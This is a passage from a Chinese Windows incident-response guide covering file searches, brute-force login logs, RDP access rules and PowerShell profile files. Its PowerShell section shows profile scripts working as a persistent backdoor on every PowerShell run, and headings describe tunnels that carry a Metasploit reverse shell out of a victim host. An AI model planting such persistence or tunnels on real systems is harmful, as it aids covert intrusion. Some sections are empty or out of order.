$duration = $endTime - $startTime

Write-Host "`n扫描开始时间: $startTime"
Write-Host "扫描结束时间: $endTime"
Write-Host ("总耗时: {0:hh\:mm\:ss}" -f $duration)

```

## 16. 小技巧

> 原文：https://books.noptrace.com/windows/15.%E5%B0%8F%E6%8A%80%E5%B7%A7/

### 0x01 查找文件

### 0x02 确定系统相关信息

`systeminfo

```

### 0x03 内存中搜索字符串

https://edr.sangfor.com.cn/#/introduction/all_tools

深信服-僵尸网络查杀工具是一款集本地查杀与云查杀功能于一体的恶意软件查杀工具。工具在云端上具备强大的病毒库，可以识别现有网络上大多数活跃的病毒威胁；在本地中又拥有强大的扫描引擎，通过对程序的静态分析以及动态虚拟执行的方式，让Windows上的恶意软件无处遁形。

使用之前可以先更新病毒库

扫描查杀功能就不多介绍了，主要介绍一下威胁检索功能

使用 `xmrig` 模拟挖矿病毒

可以看到该程序默认会连接挖矿程序作者的捐赠地址 `donate.v2.xmrig.com:3333` ，就以此为例，使用僵尸网络查杀工具进行搜索

成功发现恶意程序

### 0x04 查找文件占用小工具

### 0x05 内网传输文件

在很多场景，是不允许或者无法通过 U 盘传输文件的，如果开一个 SMB 共享又有点不合规或者冒险，所以今天推荐使用内网传输工具，以 `Localsend` 为例

https://localsend.org/zh-CN/download

建议下载便携版，这样就不需要额外的安装步骤，也就省去了最后的卸载步骤

Windows 平台可能需要额外安装 `vc_redist.exe` ，这个搞运维的师傅肯定很熟悉了，去微软官方下载对应平台的就好

https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170#visual-studio-2015-2017-2019-and-2022

服务器安装后就可以正常打开 `Localsend` 了

同时使用 Kali 模拟内网中我们的机器

此时我们希望将Windows 服务器上的文件传输到 Kali 上，我们就在 Windows 上点击 Send，之后选择文件并选择传输到哪台主机上

点击要传输的目标后，我们的 Kali 这边就会收到请求

可以通过 options 设置文件保存位置等，之后选择 Accept 接收文件

这样文件就传输过来了，如果我们希望传输给 Windows 服务器也是一样的流程，非常简单

### 1) 查找特定类型的文件

视图 -> 筛选器

这里可以寻找我们想要类型的文件，当然，大家也可以通过通配符+文件后缀的方式进行筛选

### 1. Everything

Windows 部分机制可以用来快速查找文件，比较常用的工具就是 `everything`

https://www.voidtools.com/zh-cn/

便携版直接打开就可以，需要管理员权限

### 1. IObit Unlocker

https://www.iobit.com/en/iobit-unlocker.php

使用 `ping` 来模拟文件占用

此时直接删除会报错误，使用 IObit Unlocker 进行删除

成功结束占用该文件的进程，并且并没有直接删除该文件，此时就可以正常删除之前被占用的文件了

### 2) 根据正则表达式查找文件

以匹配一个 Python 安装包为例

 `python-\d+\.\d+\.\d+-amd64\.exe

```

搜索 -> 使用正则表达式

### 2. dir

`dir` 可以用来查看目录中的文件，以下是两个使用场景

1) 查找某个目录及其子目录下名为 `evil.exe` 的程序

 `dir /s /b "C:\目录路径\evil.exe"

```
 正常逻辑看似乎是在查找某个固定路径下的 `evil.exe` ，但实际上是查找这个目录及子目录，文件名称可以使用通配符，不然就写完整的文件名

在整个操作系统中查找 `evil.exe` ，包含所有盘符中所有的目录

 `for %d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @dir /s /b %d:\evil.exe 2>nul

```
 文件名称同样可以使用通配符

### 3) 根据文件内容查找文件

搜索 -> 高级搜索

高级搜索中包含很多选项，我们可以按照实际情况进行勾选，这里在 `文件内容中包含的单词或短语(I)`处填入要检索的文件中包含的内容

请注意，这种搜索时间可能比较长，需要等待

### 3. forfiles

查找某个目录及其子目录下的 `evil.exe` (一定要注意目录不能以 \ 结尾 )

 `forfiles /p "目录路径" /s /m "evil.exe" /C "cmd /c echo @PATH"

```

在整个操作系统中查找 `evil.exe` ，包含所有盘符中所有的目录

 `for %d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @forfiles /p %d:\ /s /m "evil.exe" /c "cmd /c if @isdir==FALSE echo @path" 2>nul

```

更多使用方法详见官方文档

https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/forfiles

### 4) 根据时间筛选文件

默认并没有这个搜索和筛选选项，不过可以通过添加栏目的方式“曲线救国”

这里以创建时间为例

可以选择要查找的文件类型后再通过排序的方式查找符合创建时间的文件

当然，也可以通过 everything 语法来实现或者直接采用后文的 `Powershell` 实现

### 4. Powershell

查找某个目录及其子目录下的 `evil.exe`

 `Get-ChildItem -Path "目录路径" -Filter "文件名模式" -Recurse

```

也是可以使用通配符的

在所有盘符中的所有目录中查找文件

 `$drives = Get-PSDrive -PSProvider FileSystem

foreach ($drive in $drives) {
    $driveLetter = $drive.Name
    $rootPath = $drive.Root

    $searchPath = Join-Path -Path $rootPath -ChildPath "*"

    Write-Output "Searching in drive $driveLetter..."

    Get-ChildItem -Path $searchPath -Recurse -File -Filter "evil.exe" -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Output "Found file: $($_.FullName)"
    }
}

```

根据时间筛选文件

以查找某个时间点，在这个时间点前 5 分钟创建的所有文件

 `$intervalMinutes = 5  # 前分钟数
$targetDateTimeStr = "2024-03-05 17:02"  # 时间点
$targetDateTime = [DateTime]::ParseExact($targetDateTimeStr, "yyyy-MM-dd HH:mm", $null)
$startTime = $targetDateTime.AddMinutes(-$intervalMinutes)

Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    $drive = $_.Root
    Write-Host "Searching in drive $drive..."

    Get-ChildItem -Path $drive -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $_.CreationTime -ge $startTime -and $_.CreationTime -lt $targetDateTime
    } | Select-Object -ExpandProperty FullName
    Write-Host ""
}

```

查询两个时间点之间新建的文件

 `$startTimeStr = "2024-03-05 17:00"
$endTimeStr = "2024-03-05 17:10"
$startTime = [DateTime]::MinValue
$endTime = [DateTime]::MinValue

if ([DateTime]::TryParseExact($startTimeStr, "yyyy-MM-dd HH:mm", [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::None, [ref]$startTime) -and [DateTime]::TryParseExact($endTimeStr, "yyyy-MM-dd HH:mm", [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::None, [ref]$endTime)) {
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        $drive = $_.Root
        Write-Host "Searching in drive $drive..."

        Get-ChildItem -Path $drive -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
            $_.CreationTime -ge $startTime -and $_.CreationTime -lt $endTime
        } | Select-Object -ExpandProperty FullName
        Write-Host ""
    }
} else {
    Write-Host "Invalid time format. Please make sure the start time and end time are in the format 'yyyy-MM-dd HH:mm'."
}

```

### 5) 根据语法搜索

帮助 -> 搜索语法

语法列表详见 知识点附录 -> 0x15 Everything 语法

Everything 版本为 V1.4.1.1024 (x64)

下面列几个可能用得上的:

查找 web 路径中存在的 exe 程序

 `C:\inetpub\wwwroot\ exe:

```

查找 web 路径中内容包含 `eval` 的文件

 `C:\inetpub\wwwroot\ content:"eval"

```

查找在两个时间点内创建的文件

 `dc:>2024-03-05T17:00  dc:<2024-03-05T17:10

```

更多语法大家可以根据知识点附录 -> 0x15 Everything 语法进行了解

## 17. 知识点附录

> 原文：https://books.noptrace.com/windows/16.%E7%9F%A5%E8%AF%86%E7%82%B9%E9%99%84%E5%BD%95/

### 0x01 谁可以使用远程桌面服务

Windows 中确定可登录账号要比 Linux 麻烦一些

默认情况下，开启远程桌面登录，将自动允许以下两个组的成员登录

 - `Administrators`
 - `Remote Desktop Users`

 搜索计算机管理

计算机管理(本地) -> 系统工具 -> 本地用户和组

默认情况下 `Remote Desktop Users` 组是空的，抛开运维人员额外配置以外，还有一种情况会将用户添加到该组

如果在此处点击选择用户，之后就可以选择用户拥有使用远程桌面连接的权限

输入想要使用远程桌面的用户名，点击检查名称后，会自动识别匹配计算机中的用户名

此时点击确定，`remotetest` 用户就可以使用远程桌面连接服务器了

在计算机管理的用户和组中可以看到，`remotetest` 已经被添加到  `Remote Desktop Users`  组了

Windows 中可以通过组策略设置允许/拒绝某个用户/用户组 通过远程桌面登录

`win + r` 或点击搜索图标，填入 `Gpedit.msc`

本地计算机 策略 -> 计算机配置 -> Windows 设置 -> 安全设置 -> 本地策略 -> 用户权限分配

打开 `允许通过远程桌面服务登录`

可以看到，这里默认存在两个组，也就是上面我们讨论的。选择添加用户或组，将我们 `Users` 组中的 `remotetest`(此时只在 `Users` 组) 添加进去

刷新组策略，使其立即生效

 `gpupdate /force /target:computer

```

尝试通过 `remotetest` 进行登录

很遗憾，依旧不允许登录

本来我还以为找到了 `Windows` 管理用户登录的配置项，现在看来并不是，至少优先级不是很高

删除掉我们刚才的配置，还原默认情况，打开 `允许通过远程桌面服务登录`

默认情况下是空的，我们将管理员组的 `helper` 添加进去

刷新组策略，使其立即生效

 `gpupdate /force /target:computer

```

使用 `helper` 账户进行登录

可以看到，是无法登录的，同时正在本地登录的 `helper` 也不会被挤掉，没有任何反应

我们测试一下在 `允许/拒绝` 两个配置项中都添加 `helper` 会怎么样

尝试登录

登录不了

因此从逻辑角度来讲，`允许通过远程桌面服务登录` 的意义可能在于，`拒绝通过远程桌面服务登录` 将上述两个默认可以登录的组禁止了，之后再通过 `允许通过远程桌面服务登录` 设置特例，不然感觉不到它的意义

尝试将 `remotetest` 加入 `Remote Desktop Users` 组，之后将 `Remote Desktop Users` 组设置为拒绝登录

此时测试，`remotetest`可以远程登录到服务器

尝试使用 `remotetest` 登录系统

无法登录，经过测试，此时管理员组的 `helper` 是可以正常登录的

尝试在 `允许通过远程桌面服务登录` 中添加 `remotetest` 账户

再次尝试通过 `remotetest` 进行登录

还是无法登录

此时就无法理解 Windows 中  `允许通过远程桌面服务登录` 的意义到底是什么了，目前可以确定的是： Windows Server 2016 中能够登录远程桌面的账户为

 - `Administrators` 组内账号
 - `Remote Desktop Users` 组内账号
 - 减去 `拒绝通过远程桌面服务登录` 组策略内的账号和组

 参考文章

https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/remote/deny-user-permissions-to-logon-to-rd-session-host

### 0x02 RDP爆破登录的日志情况

`RDP` 暴力破解肯定会造成非常多的登录错误日志

 - 打开事件查看器，可以通过在开始菜单中搜索 "事件查看器" 或运行命令 `eventvwr.msc` 来打开它。
 - 在事件查看器窗口中，导航到 "Windows 日志" > "安全"。
 - 在右侧窗格中，你将看到列出的安全事件日志。
 - 在过滤器中，选择 "筛选当前日志"。
 - 在 "事件 ID" 输入框中输入 "4625"，这是与用户登录失败相关的事件 ID。
 - 单击 "确定" 按钮，将仅显示与用户登录失败相关的事件日志。

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        Administrator
    帐户域:

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC000006A

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   -
    源网络地址:  10.211.55.2
    源端口:        0

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

```
 在这些错误信息中可以获取到源IP、使用的用户名、登录的类型

这里使用的是 `goby` 进行暴力破解模拟，记录的类型是 `3` ，也就是网络登录，然而一般网络登录记录的是SMB、映射网络驱动器等

我们尝试使用 `fscan` 暴力破解

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        admin
    帐户域:

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC0000064

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   -
    源网络地址:  10.211.55.2
    源端口:        0

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

登录请求失败时在尝试访问的计算机上生成此事件。

“使用者”字段指明本地系统上请求登录的帐户。这通常是一个服务(例如 Server 服务)或本地进程(例如 Winlogon.exe 或 Services.exe)。

“登录类型”字段指明发生的登录的种类。最常见的类型是 2 (交互式)和 3 (网络)。

“进程信息”字段表明系统上的哪个帐户和进程请求了登录。

“网络信息”字段指明远程登录请求来自哪里。“工作站名”并非总是可用，而且在某些情况下可能会留为空白。

“身份验证信息”字段提供关于此特定登录请求的详细信息。
    -“传递服务”指明哪些直接服务参与了此登录请求。
    -“数据包名”指明在 NTLM 协议之间使用了哪些子协议。
    -“密钥长度”指明生成的会话密钥的长度。如果没有请求会话密钥，则此字段为 0。

```
 `fscan` 暴力破解留下的日志登录类型也是 `3`

尝试通过官方的远程工具制造登录失败日志

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        admin
    帐户域:        .

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC0000064

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   WINDOWS-11
    源网络地址:  10.211.55.53
    源端口:        0

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

```
 通过官方给 `mac` 开发的工具查看

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        admin1
    帐户域:

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC0000064

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   -
    源网络地址:  10.211.55.2
    源端口:        0

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

```
 如果是远程桌面应用登录成功呢

当输入正确的密码后，来到此页面，此时服务器的日志情况为

也是登录类型为 `3` ，当然事件`ID` 为 `4624`

类型为注销的日志登录类型也是 `3`

此时点击是，进行正常登录

紧接着刚才的日志，又产生了登录类型为 3 和 2 的登录日志

之后来到登录类型为 `10` 的日志

登录类型 `10` 就是远程互动登录了，主要就是指远程桌面

所以这里大家需要关注的是事件 `ID` 为 `4625` 的日志，而不是只关注 `4625` 日志中登录类型为 `10` 的日志

事件ID列表和登录类型列表如下

 事件ID 事件标题 描述 4624 登录成功 记录用户成功登录系统的事件，包括登录类型、登录时间和登录用户等信息。 4625 登录失败 记录登录尝试失败的事件，提供有关失败原因、失败子状态和登录用户名等信息。 4634 注销 记录用户注销系统的事件，包括注销类型和注销用户等信息。 4648 以明文密码登录 记录以明文密码方式进行的登录尝试的事件。 4768 Kerberos 预身份验证 记录使用Kerberos预身份验证的事件，通常用于服务票据（Service Ticket）的请求。 4769 Kerberos 服务票据请求 记录请求Kerberos服务票据的事件，通常用于服务认证。 4776 帐户已锁定 记录帐户由于登录失败次数超过限制而被锁定的事件。 7035 服务状态更改 记录系统中的服务状态更改事件，例如服务的启动、停止和重启。 7045 服务安装 记录新安装的服务的事件，包括服务名称和执行路径等信息。 800 Windows Update 完成 记录Windows Update 完成的事件 登录类型

 登录类型 登录标题 描述 0 System 仅由系统帐户使用，例如在系统启动时。 2 Interactive 登录到此计算机的用户 3 Network 从网络登录到此计算机的用户或计算机。 4 Batch 批处理登录类型由批处理服务器使用，其中进程可以代表用户执行，而无需用户直接干预。 5 Service 服务控制管理器已启动服务。 7 Unlock 已解锁此工作站。 8 NetworkCleartext 从网络登录到此计算机的用户。 用户的密码以未经过哈希处理的形式传递给验证包。 内置的身份验证将所有哈希凭证打包，然后再通过网络发送它们。 凭据不会以纯文本（也称为明文）形式遍历网络。 9 NewCredentials 调用方克隆了其当前令牌并为出站连接指定了新凭据。 新登录会话具有相同的本地标识，但对其他网络连接使用不同的凭据。 10 RemoteInteractive 使用终端服务或远程桌面远程登录到此计算机的用户。 11 CachedInteractive 使用存储在计算机上的本地网络凭据登录到此计算机的用户。 未联系域控制器以验证凭据。 12 CachedRemoteInteractive 与 RemoteInteractive 相同。 这用于内部审核。 13 CachedUnlock 工作站登录。 参考文档

https://learn.microsoft.com/zh-cn/windows-server/identity/securing-privileged-access/reference-tools-logon-types

https://learn.microsoft.com/zh-cn/windows/security/threat-protection/auditing/event-4624

### 0x03 RDP和SMB登录失败日志的区别

在 Windows Server 2016 中， `RDP` 和 `SMB` 登录失败的日志ID均为 `4625` ，登录类型均为 `3`

但是经过多种工具测试发现: SMB协议登录失败会记录源端口、RDP协议登录源端口为 0

### 0x04 FTP 状态码列表

FTP（文件传输协议）定义了一系列状态码，用于表示服务器对客户端请求的响应状态。下面是一些常见的FTP状态码及其含义的示例：

### 0x05 FTP 命令列表

FTP（文件传输协议）定义了一些常见的方法（也称为命令），用于在客户端和服务器之间进行文件传输和管理。以下是一些常见的FTP方法：

 - USER：用于指定登录用户名。

 - PASS：用于指定登录密码。

 - LIST：列出指定目录下的文件和子目录。
 - CWD（Change Working Directory）：改变当前工作目录。
 - PWD（Print Working Directory）：打印当前工作目录的路径。
 - RETR（Retrieve）：从服务器下载（获取）文件。
 - STOR（Store）：向服务器上传（存储）文件。
 - DELE（Delete）：删除服务器上的指定文件。
 - MKD（Make Directory）：创建新目录。
 - RMD（Remove Directory）：删除目录。
 - RNFR（Rename From）：重命名文件或目录的起始位置。
 - RNTO（Rename To）：重命名文件或目录的目标位置。
 - ABOR（Abort）：中止正在进行的文件传输。
 - QUIT：断开与服务器的连接并退出FTP会话。

 除了上述方法，FTP还支持其他一些方法，如APPE（追加文件内容）和SIZE（获取文件大小），这些方法的具体实现可能会因FTP服务器的不同而有所差异。此外，FTP还支持一些用于传输数据的命令，如PASV（被动模式）和PORT（主动模式）。

### 0x06 CobaltStrike DNS 隧道演示

大家也可以在本地进行实验，这里为了贴近真实，采用真实的域名和VPS服务器

### 0x07 Pingtunnel ICMP隧道演示

场景为受害主机只允许 `ICMP` ，现在想上线 `MSF`，所以我们要将受害主机与攻击机中间建立一条隧道，之后让`msf`的 `tcp`木马通过隧道反弹 `shell`

### 0x08 Kcptun KCP 隧道演示

内网受害主机和攻击机之间创建一个 `KCP` 协议的隧道，之后通过该隧道完成 `MSF` 上线

受害主机： 10.211.55.52

攻击主机： xx.xx.xx.xx

### 0x09 Gost QUIC 隧道演示

`gost` 这个工具建议大家有时间尝试一下，这里演示使用的是 `V3` 版本的

### 0x10 谁决定计划任务的执行结果

### 0x11 PowerShell 配置文件实验

`cmd` 没有类似于 `bash` 的配置文件，但是 `Powershell` 是有的

https://learn.microsoft.com/zh-cn/Powershell/module/microsoft.Powershell.core/about/about_profiles?view=Powershell-7.4

PowerShell 控制台支持以下基本配置文件。 配置文件按照执行顺序列出。

 - 所有用户，所有主机
 - Windows - `$PSHOME\Profile.ps1`。
 - Linux - `/opt/microsoft/Powershell/7/profile.ps1`
 - macOS - `/usr/local/microsoft/Powershell/7/profile.ps1`

 - 所有用户，当前主机
 - Windows - `$PSHOME\Microsoft.PowerShell_profile.ps1`。
 - Linux - `/opt/microsoft/Powershell/7/Microsoft.PowerShell_profile.ps1`
 - macOS - `/usr/local/microsoft/Powershell/7/Microsoft.PowerShell_profile.ps1`

 - 当前用户，所有主机
 - Windows - `$HOME\Documents\PowerShell\Profile.ps1`。
 - Linux - `~/.config/Powershell/profile.ps1`
 - macOS - `~/.config/Powershell/profile.ps1`

 - 当前用户，当前主机
 - Windows - `$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1`。
 - Linux - `~/.config/Powershell/Microsoft.PowerShell_profile.ps1`
 - macOS - `~/.config/Powershell/Microsoft.PowerShell_profile.ps1`

 `$PROFILE` 自动变量存储当前会话中可用的 PowerShell 配置文件的路径。

若要查看配置文件路径，请显示 `$PROFILE` 变量的值。 还可以在命令中使用 `$PROFILE` 变量来表示路径。

`$PROFILE` 变量存储“当前用户，当前主机”配置文件的路径。 其他配置文件保存在 `$PROFILE` 变量的注释属性中。

例如，`$PROFILE` 变量在 Windows PowerShell 控制台中具有以下值。

 - 当前用户，当前主机 - `$PROFILE`
 - 当前用户，当前主机 - `$PROFILE.CurrentUserCurrentHost`
 - 当前用户，所有主机 - `$PROFILE.CurrentUserAllHosts`
 - 所有用户，当前主机 - `$PROFILE.AllUsersCurrentHost`
 - 所有用户，所有主机 - `$PROFILE.AllUsersAllHosts`

 由于每个用户和每个主机应用程序中 `$PROFILE` 变量的值发生更改，因此请确保在所使用的每个 PowerShell 主机应用程序中显示配置文件变量的值。

若要查看 `$PROFILE` 变量的当前值，请键入：

PowerShell

 `$PROFILE | Select-Object *

```

 `AllUsersAllHosts       : C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
AllUsersCurrentHost    : C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1
CurrentUserAllHosts    : C:\Users\Administrator\Documents\WindowsPowerShell\profile.ps1
CurrentUserCurrentHost : C:\Users\Administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

```
 这些配置文件中都可以类似 `Bash` 配置文件一样，在其中放置后门程序

默认情况下都不存在这些文件

接下来进行试验

创建 `C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1` 输出字符 `I am a Backdoor`

 `Write-Host "I am a Backdoor"

```

在 `cmd` 中输入 `Powershell` 进入 `Powershell`

创建 `C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1`

输出字符 `I am the second Backdoor`

在 `Powershell` 中输入 `Powershell` 进入新的 `Powershell`

创建 `C:\Users\Administrator\Documents\WindowsPowerShell\profile.ps1`

输出 `I am the third Backdoor`

发现连 `WindowsPowerShell` 这个目录都没有，创建目录及文件

在 `Powershell` 中输入 `Powershell` 进入新的 `Powershell`

创建 `C:\Users\Administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1`

输出 `I am the fourth Backdoor`

刚才已经创建了目录，现在直接创建文件了

在 `Powershell` 中输入 `Powershell` 进入新的 `Powershell`

这四个配置文件均可正常使用

尝试重启电脑，再次进入 `Powershell`

仍然有效

现在有一个疑问，如果不是进入 `Powershell` 控制台，直接执行正常的 `Powershell` 脚本会执行吗

编写一个向控制台输出 `Hello World` 的脚本，同时弹出消息框的脚本 `demo.ps1`

 `Write-Host "Hello World"

# 弹出一个消息框
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Hello, World!")

```
 在第一个后门文件中额外插入`Powershell` 代码，将 `I am a Backdoor` 写入到桌面的 `backdoor.txt` 中

先是在 `cmd` 中进行测试

 `Powershell ./demo.ps1

```

删除 `backdoor.txt` 图形化右键执行 `demo.ps1`

也就是说这类后门对所有的 Powershell 程序有效

### 0x12 服务隐藏与排查

这部分主要指通过配置访问控制策略来实现隐藏的方式，通过修改内存链表的方式隐藏暂时不包含

### 0x13 如何验证程序签名

### 0x14 如何以其他用户执行命令

在Windows Server 2016中，没有与Linux的`su`命令完全等价的功能。不过，Windows提供了几种方式来切换用户或获取其他用户的权限执行任务

但是这里有一个明显区别： Windows 中 runas 命令即使是system权限切换到普通用户也需要输入普通用户的密码

### 0x15 Everything 语法

`操作符:
    space   与 (AND)
    |   或 (OR)
    !   非 (NOT)
    < > 分组
    " " 搜索引号内的词组.

通配符:
    *   匹配 0 个或多个字符.
    ?   匹配 1 个字符.

宏:
    quot:   双引号 (")
    apos:   单引号 (')
    amp:    与号 (&)
    lt: 小于 (<)
    gt: 大于 (>)
    #<n>:   十进制 Unicode 字符 <n>.
    #x<n>:  十六进制 Unicode 字符 <n>.
    audio:  搜索音频文件.
    zip:    搜索压缩文件.
    doc:    搜索文档文件.
    exe:    搜索可执行文件.
    pic:    搜索图片文件.
    video:  搜索视频文件.

修饰符:
    ascii:  启用快速 ASCII 大小写对比.
    case:   区分大小写.
    diacritics: 匹配变音标记.
    file:   仅匹配文件.
    folder: 仅匹配文件夹.
    noascii:    禁用快速 ASCII 大小写对比.
    nocase: 不区分大小写.
    nodiacritics:   不匹配变音标记.
    nofileonly: 仅不允许文件.
    nofolderonly:   仅不允许文件夹.
    nopath: 不匹配路径.
    noregex:    禁用正则表达式.
    nowfn:  不匹配完整文件名.
    nowholefilename:    不匹配完整文件名.
    nowholeword:    仅禁用全字匹配.
    nowildcards:    禁用通配符.
    noww:   仅禁用全字匹配.
    path:   匹配路径和文件名.
    regex:  启用正则表达式.
    utf8:   禁用快速 ASCII 大小写对比.
    wfn:    匹配完整文件名.
    wholefilename:  匹配完整文件名.
    wholeword:  仅匹配全字符.
    wildcards:  启用通配符.
    ww: 仅全字匹配.

函数:
    album:<text>    搜索媒体专辑元数据.
    ansicontent:<text>  搜索 ANSI 格式文本内容.
    artist:<text>   搜索媒体艺术家元数据.
    attrib:<attributes> 搜索指定的文件属性的文件和文件夹.
    attribdupe: 搜索含有相同属性的文件和文件夹.
    attributes:<attributes> 搜索指定的文件属性的文件和文件夹.
    bitdepth:<bitdepth> 搜索指定像素密度的图片.
    child:<filename>    搜索包含匹配文件名文件的文件夹.
    childcount:<count>  搜索包含有指定数目子文件夹或文件的文件夹.
    childfilecount:<count>  搜索包含有指定数目文件的文件夹.
    childfoldercount:<n>    搜索包含有指定数目子文件的文件夹.
    comment:<text>  搜索媒体注释元数据.
    content:<text>  搜索文本内容.
    count:<max> 指定搜索结果最大值.
    dateaccessed:<date> 搜索指定访问时间的文件和文件夹.
    datecreated:<date>  搜索指定创建日期的文件和文件夹.
    datemodified:<date> 搜索指定修改日期的文件和文件夹.
    daterun:<date>  搜索指定打开时间的文件和文件夹.
    da:<date>   搜索指定访问时间的文件和文件夹.
    dadupe: 搜索含有相同访问时间的文件和文件夹.
    dc:<date>   搜索指定创建日期的文件和文件夹.
    dcdupe: 搜索含有相同创建时间的文件和文件夹.
    dimensions:<w>X<h>  搜索指定长宽的图片.
    dm:<date>   搜索指定修改日期的文件和文件夹.
    dmdupe: 搜索含有相同修改时间的文件和文件夹.
    dr:<date>   搜索指定打开时间的文件和文件夹.
    dupe:   搜索重复的文件名.
    empty:  搜索空文件夹.
    endwith:<text>  搜索以指定文本结尾的文件 (包含扩展名).
    ext:<ext1;ext2;...> 搜索和列表中指定的扩展名匹配的文件 (扩展名以分号分隔).
    filelist:<fn1|fn2|...>  搜索文件名列表中的文件.
    filelistfilename:<name> 搜索文件名列表中的文件和文件夹.
    frn:<frn>   搜索指定文件索引号的文件和文件夹.
    fsi:<index> 搜索指定盘符索引中文件或文件夹 (索引 0 表示 C 盘, 以此类推).
    genre:<text>    搜索媒体流派元数据.
    height:<height> 搜索指定像素高度的图片.
    infolder:<path> 搜索指定路径下的文件和文件夹 (不包含子文件夹).
    len:<length>    搜索和指定的文件名长度相匹配的文件和文件夹.
    namepartdupe:   搜索含有相同名称部分的文件和文件夹.
    orientation:<type>  搜索指定方向的图片 (水平或竖直).
    parent:<path>   搜索指定路径下的文件和文件夹 (不包含子文件夹).
    parents:<count> 搜索有指定数目父文件夹的文件和文件夹.
    rc:<date>   搜索指定最近修改日期的文件和文件夹.
    recentchange:<date> 搜索指定最近修改日期的文件和文件夹.
    root:   搜索没有父文件夹的文件和文件夹.
    runcount:<count>    搜索指定打开次数的文件和文件夹.
    shell:<name>    搜索已知的 Shell 文件夹名称, 包括子目录和文件.
    size:<size> 搜索指定大小的文件 (以字节为单位).
    sizedupe:   搜索大小重复的文件.
    startwith:<text>    搜索指定文本开头的文件.
    title:<text>    搜索媒体标题元数据.
    track:<number>  搜索指定音轨号的媒体文件.
    type:<type> 搜索指定的文件类型的文件和文件夹.
    utf16content:<text> 搜索 UTF-16 格式文本内容.
    utf16becontent:<text>   搜索 UTF-16 BE 格式文本内容.
    utf8content:<text>  搜索 UTF-8 格式文本内容.
    width:<width>   搜索指定像素宽度的图片.

函数语法:
    function:value  等于某设定值.
    function:<=value    小于等于某设定值.
    function:<value 小于某设定值.
    function:=value 等于某设定值.
    function:>value 大于某设定值.
    function:>=value    大于等于某设定值.
    function:start..end 在起始值和终止值的范围内.
    function:start-end  在起始值和终止值的范围内.

大小语法:
    size[kb|mb|gb]

大小常数:
    empty
    tiny    0 KB < 大小 <= 10 KB
    small   10 KB < 大小 <= 100 KB
    medium  100 KB < 大小 <= 1 MB
    large   1 MB < 大小 <= 16 MB
    huge    16 MB < 大小 <= 128 MB
    gigantic    大小 > 128 MB
    unknown

日期语法:
    year
    month/year 或者 year/month 取决于本地设置
    day/month/year, month/day/year 或者 year/month/day 取决于本地设置
    YYYY[-MM[-DD[Thh[:mm[:ss[.sss]]]]]]
    YYYYMM[DD[Thh[mm[ss[.sss]]]]]

日期常数:
    today
    yesterday
    tomorrow
    <last|past|prev|current|this|coming|next><year|month|week>
    <last|past|prev|coming|next><x><years|months|weeks|days|hours|minutes|mins|seconds|secs>
    january|february|march|april|may|june|july|august|september|october|november|december
    jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec
    sunday|monday|tuesday|wednesday|thursday|friday|saturday
    sun|mon|tue|wed|thu|fri|sat
    unknown

属性常数:
    A   存档
    C   压缩
    D   目录
    E   加密
    H   隐藏
    I   未索引的内容
    L   重解析点
    N   一般
    O   离线
    P   稀疏文件
    R   只读
    S   系统
    T   临时
    V   设备

```

### 1. 简介

由于 Windows 不开源，而 Windows 的某一项服务可能受多个配置项影响，所以很多研究员通过逆向的方式，分析服务调用过程，推测执行流程，例如

https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw

